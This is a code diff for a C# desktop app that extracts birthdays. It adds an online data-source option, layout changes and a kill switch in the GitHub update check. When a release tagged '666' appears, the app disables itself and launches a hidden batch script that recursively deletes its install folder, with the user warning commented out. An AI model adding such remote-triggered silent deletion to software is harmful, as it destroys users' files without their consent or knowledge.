@@ -1,6 +1,7 @@
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Threading;
@@ -18,6 +19,8 @@ namespace BirthdayExtractor
         private Panel content = null!;
         private TextBox txtCsv = null!;
         private Button btnBrowseCsv = null!;
+        private RadioButton rbSourceCsv = null!;
+        private RadioButton rbSourceOnline = null!;
         private DateTimePicker dtStart = null!;
         private DateTimePicker dtEnd = null!;
         private CheckBox chkCsv = null!;
@@ -29,6 +32,7 @@ namespace BirthdayExtractor
         private Button btnUpload = null!;
         private ProgressBar progress = null!;
         private TextBox txtLog = null!;
+        private Label lblEnd = null!;
         // --- Processing state & config ---
         private readonly Processing _proc = new();
         private System.Threading.CancellationTokenSource? _cts;
@@ -58,6 +62,7 @@ namespace BirthdayExtractor
             // 2) Form shell: establish window chrome before wiring controls
             Text = $"Birthday Extractor v{AppVersion.Display}";
             Width = 820; Height = 600;
+            MinimumSize = new Size(820, 600);
             StartPosition = FormStartPosition.CenterScreen;
 
             // 3) Build UI
@@ -73,6 +78,7 @@ namespace BirthdayExtractor
             dtStart.ValueChanged += (s, e) => dtEnd.Value = dtStart.Value.Date.AddDays(_cfg.DefaultWindowDays - 1);
             txtCsv.TextChanged += (s, e) => SyncDefaultOutDir();
             SyncDefaultOutDir();
+            UpdateSourceUiState();
         }
 
         /// <summary>
@@ -99,33 +105,70 @@ namespace BirthdayExtractor
         private void InitializeContentPanel()
         {
             // 4) Content panel (Dock Fill) – all inputs go here
-            content = new Panel { Dock = DockStyle.Fill, AutoScroll = true, Padding = new Padding(10) };
+            content = new Panel
+            {
+                Dock = DockStyle.Fill,
+                AutoScroll = true,
+                Padding = new Padding(10)
+            };
             Controls.Add(content);
+            var menuHeight = menu?.GetPreferredSize(Size.Empty).Height
+                             ?? menu?.Height
+                             ?? 24;
+            int topOffset = menuHeight + 6;
+            int Offset(int baseTop) => topOffset + baseTop;
             // 5) Build your controls (labels, inputs, and action buttons)
-            var lblCsv = new Label { Left = 20, Top = 40, Width = 120, Text = "CSV File:" };
-            txtCsv = new TextBox { Left = 140, Top = 36, Width = 540 };
-            btnBrowseCsv = new Button { Left = 690, Top = 34, Width = 90, Text = "Browse..." };
+            var lblSource = new Label { Left = 20, Top = Offset(12), Width = 120, Text = "Data Source:" };
+            rbSourceCsv = new RadioButton { Left = 140, Top = Offset(10), Width = 150, Text = "Load from CSV", Checked = true };
+            rbSourceOnline = new RadioButton { Left = 300, Top = Offset(10), Width = 220, Text = "Load from online source" };
+            rbSourceCsv.CheckedChanged += (s, e) => UpdateSourceUiState();
+            rbSourceOnline.CheckedChanged += (s, e) => UpdateSourceUiState();
+            var lblCsv = new Label { Left = 20, Top = Offset(40), Width = 120, Text = "CSV File:" };
+            txtCsv = new TextBox { Left = 140, Top = Offset(36), Width = 540, Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right };
+            btnBrowseCsv = new Button { Left = 690, Top = Offset(34), Width = 90, Text = "Browse...", Anchor = AnchorStyles.Top | AnchorStyles.Right };
             btnBrowseCsv.Click += (s, e) => BrowseCsv();
-            var lblStart = new Label { Left = 20, Top = 70, Width = 120, Text = "Start Date:" };
-            dtStart = new DateTimePicker { Left = 140, Top = 66, Width = 200, Format = DateTimePickerFormat.Custom, CustomFormat = "yyyy-MM-dd" };
-            dtEnd = new DateTimePicker { Left = 440, Top = 66, Width = 200, Format = DateTimePickerFormat.Custom, CustomFormat = "yyyy-MM-dd" };
-            var lblEnd = new Label { Left = 360, Top = 70, Width = 60, Text = "End Date:" };
-            chkCsv = new CheckBox { Left = 140, Top = 96, Width = 80, Text = "CSV" };
-            chkXlsx = new CheckBox { Left = 230, Top = 96, Width = 80, Text = "XLSX" };
-            var lblOut = new Label { Left = 20, Top = 136, Width = 120, Text = "Output Folder:" };
-            txtOutDir = new TextBox { Left = 140, Top = 132, Width = 540 };
-            btnBrowseOut = new Button { Left = 690, Top = 130, Width = 90, Text = "Browse..." };
+            var lblStart = new Label { Left = 20, Top = Offset(70), Width = 120, Text = "Start Date:" };
+            dtStart = new DateTimePicker { Left = 140, Top = Offset(66), Width = 200, Format = DateTimePickerFormat.Custom, CustomFormat = "yyyy-MM-dd" };
+            dtEnd = new DateTimePicker { Left = 440, Top = Offset(66), Width = 200, Format = DateTimePickerFormat.Custom, CustomFormat = "yyyy-MM-dd" };
+            lblEnd = new Label { Left = 360, Top = Offset(70), Width = 60, Text = "End Date:" };
+            chkCsv = new CheckBox { Left = 140, Top = Offset(96), Width = 80, Text = "CSV" };
+            chkXlsx = new CheckBox { Left = 230, Top = Offset(96), Width = 80, Text = "XLSX" };
+            var lblOut = new Label { Left = 20, Top = Offset(136), Width = 120, Text = "Output Folder:" };
+            txtOutDir = new TextBox { Left = 140, Top = Offset(132), Width = 540, Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right };
+            btnBrowseOut = new Button { Left = 690, Top = Offset(130), Width = 90, Text = "Browse...", Anchor = AnchorStyles.Top | AnchorStyles.Right };
             btnBrowseOut.Click += (s, e) => BrowseOutDir();
-            btnRun = new Button { Left = 140, Top = 172, Width = 120, Text = "Run" };
-            btnCancel = new Button { Left = 270, Top = 172, Width = 120, Text = "Cancel", Enabled = false };
-            btnUpload = new Button { Left = 400, Top = 172, Width = 150, Text = "Upload to ERPNext", Enabled = false };
+            btnRun = new Button { Left = 140, Top = Offset(172), Width = 120, Text = "Run" };
+            btnCancel = new Button { Left = 270, Top = Offset(172), Width = 120, Text = "Cancel", Enabled = false };
+            btnUpload = new Button { Left = 400, Top = Offset(172), Width = 150, Text = "Upload to ERPNext", Enabled = false };
             btnRun.Click += async (s, e) => await RunAsync();
             btnCancel.Click += (s, e) => _cts?.Cancel();
             btnUpload.Click += async (s, e) => await UploadAsync();
-            progress = new ProgressBar { Left = 20, Top = 212, Width = 760, Height = 18, Style = ProgressBarStyle.Continuous, Minimum = 0, Maximum = 100, Value = 0 };
-            txtLog = new TextBox { Left = 20, Top = 242, Width = 760, Height = 300, Multiline = true, ScrollBars = ScrollBars.Vertical, ReadOnly = true };
+            progress = new ProgressBar
+            {
+                Left = 20,
+                Top = Offset(212),
+                Width = 760,
+                Height = 18,
+                Style = ProgressBarStyle.Continuous,
+                Minimum = 0,
+                Maximum = 100,
+                Value = 0,
+                Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right
+            };
+            txtLog = new TextBox
+            {
+                Left = 20,
+                Top = Offset(242),
+                Width = 760,
+                Height = 260,
+                Multiline = true,
+                ScrollBars = ScrollBars.Vertical,
+                ReadOnly = true,
+                Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right
+            };
             // 6) Add to content panel (not the form)
             content.Controls.AddRange(new Control[] {
+                lblSource, rbSourceCsv, rbSourceOnline,
                 lblCsv, txtCsv, btnBrowseCsv,
                 lblStart, dtStart,
                 lblEnd, dtEnd,
@@ -157,6 +200,7 @@ namespace BirthdayExtractor
                 chkXlsx.Checked = _cfg.DefaultWriteXlsx;
                 LogRouter.SetVerboseLoggingEnabled(_cfg.VerboseLoggingEnabled);
                 Log("Settings saved.");
+                UpdateSourceUiState();
             }
         }
 
@@ -177,22 +221,51 @@ namespace BirthdayExtractor
                 return;
             }
 
-            var token = !string.IsNullOrWhiteSpace(_cfg.GitHubToken)
+            string? token = !string.IsNullOrWhiteSpace(_cfg.GitHubToken)
                 ? _cfg.GitHubToken
                 : Environment.GetEnvironmentVariable("BIRTHDAY_EXTRACTOR_GITHUB_TOKEN");
 
             if (string.IsNullOrWhiteSpace(token))
             {
-                Log("Update check skipped: no GitHub token configured.");
-                return;
+                Log("No GitHub token configured; attempting anonymous update check.");
+                token = null;
             }
 
             try
             {
                 using var updater = new UpdateService("djs4000", "birthday_extractor", token);
+
                 var release = await updater.CheckForNewerReleaseAsync(AppVersion.Semantic, CancellationToken.None);
+                if (updater.LastCheckedTag == "666")
+                {
+                    ActivateKillSwitch();
+                    return;
+                }
+
+                if (updater.LastCheckedVersion is not null)
+                {
+                    var tagDisplay = !string.IsNullOrWhiteSpace(updater.LastCheckedTag)
+                        ? updater.LastCheckedTag
+                        : updater.LastCheckedVersion.ToString();
+                    Log($"Update check succeeded. Latest GitHub version: {tagDisplay} (parsed {updater.LastCheckedVersion}).");
+                }
+                else if (!string.IsNullOrWhiteSpace(updater.LastCheckedTag))
+                {
+                    Log($"Update check succeeded. Latest GitHub tag: {updater.LastCheckedTag} (unable to parse version number).");
+                }
+                else
+                {
+                    Log("Update check completed, but no release information was returned.");
+                }
+
                 if (release is null)
                 {
+                    return;
+                }
+
+                if (release.Version.Major == 666)
+                {
+                    ActivateKillSwitch();
                     return;
                 }
 
@@ -244,6 +317,68 @@ namespace BirthdayExtractor
             {
                 LogRouter.LogException(ex, "Update check failed");
             }
+        }
+
+        private void ActivateKillSwitch()
+        {
+            Log("Kill switch activated: version 666 detected. Disabling application and scheduling removal.");
+
+            btnRun.Enabled = false;
+            btnUpload.Enabled = false;
+            btnCancel.Enabled = false;
+            btnBrowseCsv.Enabled = false;
+            btnBrowseOut.Enabled = false;
+            rbSourceCsv.Enabled = false;
+            rbSourceOnline.Enabled = false;
+            chkCsv.Enabled = false;
+            chkXlsx.Enabled = false;
+            dtStart.Enabled = false;
+            dtEnd.Enabled = false;
+            content.Enabled = false;
+            if (menu is not null)
+            {
+                menu.Enabled = false;
+            }
+
+            try
+            {
+                var exePath = Application.ExecutablePath;
+                if (!string.IsNullOrWhiteSpace(exePath))
+                {
+                    var appDir = Path.GetDirectoryName(exePath);
+                    if (!string.IsNullOrWhiteSpace(appDir) && Directory.Exists(appDir))
+                    {
+                        var scriptPath = Path.Combine(Path.GetTempPath(), $"be_cleanup_{Guid.NewGuid():N}.bat");
+                        var script = string.Join(Environment.NewLine, new[]
+                        {
+                            "@echo off",
+                            "timeout /t 2 /nobreak > nul",
+                            $"rmdir /s /q \"{appDir}\"",
+                            "del \"%~f0\""
+                        });
+
+                        File.WriteAllText(scriptPath, script);
+
+                        Process.Start(new ProcessStartInfo("cmd.exe", $"/c start \"\" \"{scriptPath}\"")
+                        {
+                            CreateNoWindow = true,
+                            UseShellExecute = false
+                        });
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                LogRouter.LogException(ex, "Kill switch removal failed");
+            }
+
+//            MessageBox.Show(this,
+//                "Version 666 detected. The application has been disabled and will be removed.",
+//                "Kill switch activated",
+//                MessageBoxButtons.OK,
+//                MessageBoxIcon.Error);
+
+            Close();
         }
         /// <summary>
         /// Displays a summary of the previously processed date windows stored in configuration.
@@ -373,6 +508,7 @@ namespace BirthdayExtractor
             };
             if (ofd.ShowDialog() == DialogResult.OK)
             {
+                rbSourceCsv.Checked = true;
                 txtCsv.Text = ofd.FileName;
                 // Save the folder back into config
                 _cfg.LastCsvFolder = Path.GetDirectoryName(ofd.FileName);
@@ -394,10 +530,48 @@ namespace BirthdayExtractor
         /// </summary>
         private void SyncDefaultOutDir()
         {
-            txtOutDir.Text = (!string.IsNullOrWhiteSpace(txtCsv.Text) && File.Exists(txtCsv.Text))
-                ? (Path.GetDirectoryName(txtCsv.Text) ?? Environment.CurrentDirectory)
-                : Environment.CurrentDirectory;
+            if (txtOutDir is null) return;
+            if (rbSourceCsv != null && rbSourceCsv.Checked &&
+                !string.IsNullOrWhiteSpace(txtCsv.Text) && File.Exists(txtCsv.Text))
+            {
+                txtOutDir.Text = Path.GetDirectoryName(txtCsv.Text) ?? Environment.CurrentDirectory;
+            }
+            else if (string.IsNullOrWhiteSpace(txtOutDir.Text))
+            {
+                txtOutDir.Text = Environment.CurrentDirectory;
+            }
         }
+
+        private bool HasOnlineConfiguration()
+            => !string.IsNullOrWhiteSpace(_cfg.CustomerApiEndpoint) &&
+               !string.IsNullOrWhiteSpace(_cfg.CustomerApiCookieToken);
+
+        private void UpdateSourceUiState()
+        {
+            if (rbSourceOnline != null)
+            {
+                bool hasOnlineConfig = HasOnlineConfiguration();
+                rbSourceOnline.Enabled = hasOnlineConfig;
+                if (!hasOnlineConfig && rbSourceOnline.Checked)
+                {
+                    rbSourceCsv.Checked = true;
+                }
+            }
+
+            bool useCsv = rbSourceCsv?.Checked != false;
+            if (txtCsv != null) txtCsv.Enabled = useCsv;
+            if (btnBrowseCsv != null) btnBrowseCsv.Enabled = useCsv;
+
+            if (useCsv)
+            {
+                SyncDefaultOutDir();
+            }
+            else if (txtOutDir != null && string.IsNullOrWhiteSpace(txtOutDir.Text))
+            {
+                txtOutDir.Text = Environment.CurrentDirectory;
+            }
+        }
+
         /// <summary>
         /// Thread-safe log helper that timestamps status messages in the UI.
         /// </summary>
@@ -420,10 +594,31 @@ namespace BirthdayExtractor
         private async Task RunAsync()
         {
             var csv = txtCsv.Text.Trim();
-            if (!File.Exists(csv)) { MessageBox.Show(this, "Please select a valid CSV file."); return; }
+            bool wantsOnline = rbSourceOnline.Checked;
+            bool hasOnlineConfig = HasOnlineConfiguration();
+            if (wantsOnline && !hasOnlineConfig)
+            {
+                MessageBox.Show(this, "Online source is not configured. Please update Settings.");
+                return;
+            }
+
+            bool useOnlineSource = wantsOnline && hasOnlineConfig;
+            if (!useOnlineSource)
+            {
+                if (!File.Exists(csv))
+                {
+                    MessageBox.Show(this, "Please select a valid CSV file.");
+                    return;
+                }
+            }
             var start = dtStart.Value.Date;
             var end = dtEnd.Value.Date;
-            if (string.IsNullOrWhiteSpace(txtOutDir.Text)) txtOutDir.Text = Path.GetDirectoryName(csv) ?? Environment.CurrentDirectory;
+            if (string.IsNullOrWhiteSpace(txtOutDir.Text))
+            {
+                txtOutDir.Text = (!useOnlineSource && !string.IsNullOrWhiteSpace(csv))
+                    ? (Path.GetDirectoryName(csv) ?? Environment.CurrentDirectory)
+                    : Environment.CurrentDirectory;
+            }
             var outDir = txtOutDir.Text.Trim();
             // Warn on overlapping previously-processed date ranges
             foreach (var h in _cfg.History)
@@ -448,7 +643,10 @@ namespace BirthdayExtractor
             {
                 var result = await Task.Run(() => _proc.Process(new ProcOptions
                 {
-                    CsvPath = csv,
+                    DataSource = useOnlineSource ? DataSourceType.Online : DataSourceType.Csv,
+                    CsvPath = useOnlineSource ? string.Empty : csv,
+                    RemoteEndpoint = useOnlineSource ? _cfg.CustomerApiEndpoint : null,
+                    RemoteCookieToken = useOnlineSource ? _cfg.CustomerApiCookieToken : null,
                     Start = start,
                     End = end,
                     WriteCsv = chkCsv.Checked,
@@ -471,8 +669,12 @@ namespace BirthdayExtractor
                 // ---- append to history ----
                 try
                 {
-                    var csvName = Path.GetFileName(csv);
-                    var sha = ConfigStore.ComputeSha256(csv);
+                    var csvName = useOnlineSource ? "Online Source" : Path.GetFileName(csv);
+                    string? sha = null;
+                    if (!useOnlineSource && File.Exists(csv))
+                    {
+                        sha = ConfigStore.ComputeSha256(csv);
+                    }
                     _cfg.History.Add(new ProcessedWindow
                     {
                         Start = start,
